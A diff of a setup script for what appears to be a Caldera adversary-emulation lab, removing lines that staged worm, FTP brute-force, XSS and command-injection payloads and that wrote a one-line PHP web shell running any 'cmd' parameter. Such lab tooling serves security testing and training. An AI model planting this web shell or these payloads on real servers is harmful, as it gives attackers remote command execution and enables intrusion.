@@ -3,29 +3,6 @@ ip route add 0.0.0.0/0 via 192.168.0.1 dev eth0
 
 echo 'nameserver 1.1.1.1' >> /etc/resolv.conf
 
-# Worm scripts
-cp /shared/scripts/worm.cpp /shared/caldera/data/payloads/worm.cpp
-cp /shared/scripts/worm.hpp /shared/caldera/data/payloads/worm.hpp
-cp /shared/scripts/spread_w.exp /shared/caldera/data/payloads/spread_w.exp
-chmod +x /shared/caldera/data/payloads/spread_w.exp
-
-# Web-shell and brute force scripts
-cp /shared/usernames.txt /shared/caldera/data/payloads/usernames.txt
-cp /shared/common_psw.txt /shared/caldera/data/payloads/passwords.txt
-cp /shared/scripts/ftp_brute_force.cpp /shared/caldera/data/payloads/ftp_brute_force.cpp
-echo "<?php system(\$_GET['cmd']); ?>" > /shared/caldera/data/payloads/shell.php
-cp /shared/scripts/ftp_put_file.cpp /shared/caldera/data/payloads/ftp_put_file.cpp
-cp /shared/scripts/ftp_put.exp /shared/caldera/data/payloads/ftp_put.exp
-chmod +x /shared/caldera/data/payloads/ftp_put.exp
-
-# XSS scripts
-cp /shared/scripts/XSS_script.txt /shared/caldera/data/payloads/XSS_script.txt
-cp /shared/scripts/put_xss.exp /shared/caldera/data/payloads/put_xss.exp
-chmod +x /shared/caldera/data/payloads/put_xss.exp
-
-# Command injection script
-cp /shared/scripts/command_inj.cpp /shared/caldera/data/payloads/command_inj.cpp
-
 cp /shared/caldera/local.yml /usr/src/app/conf/
 cp -r /shared/caldera/data/* /usr/src/app/data/
 cp -r /shared/caldera/app/* /usr/src/app/
